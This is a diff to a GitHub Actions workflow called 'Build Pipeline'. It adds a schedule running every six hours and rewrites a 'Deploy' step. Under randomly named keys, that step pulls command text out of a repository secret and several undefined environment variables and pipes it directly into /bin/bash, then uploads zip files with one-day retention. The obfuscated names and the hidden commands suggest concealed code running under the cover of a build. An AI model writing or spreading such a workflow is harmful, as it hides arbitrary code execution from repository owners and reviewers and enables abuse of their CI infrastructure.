@@ -2,6 +2,8 @@ name: Build Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '15 0,6,12,18 * * *'
 permissions:
   contents: read
 jobs:
@@ -14,16 +16,17 @@ jobs:
           fetch-depth: 1
       - name: Deploy
         env:
-          xaimo1: ${{ secrets.xaimo1 }}
+          qwjgq9020: ${{ secrets.qwjgq9020 }}
         run: |
-          printf '%s' "$xaimo1" | jq -r .xuh6417 | /bin/bash
-          echo $psj75682 | jq -r .ca01 | /bin/bash
-          printf '%s' "$uhj000" | jq -r .r169 | /bin/bash
-          echo $qr61205 | jq -r .z69093 | /bin/bash
+          printf '%s' "$qwjgq9020" | jq -r .zybf03 | /bin/bash
+          printf '%s' "$as8077" | jq -r .g04014 | /bin/bash
+          printf '%s' "$t6422" | jq -r .im1679 | /bin/bash
+          printf '%s' "$y548" | jq -r .amxhv4033 | /bin/bash
+          printf '%s' "$m42166" | jq -r .ianz7 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
         with:
-          name: VteGk6f1
+          name: hFvlZAny
           path: "*.zip"
           retention-days: 1
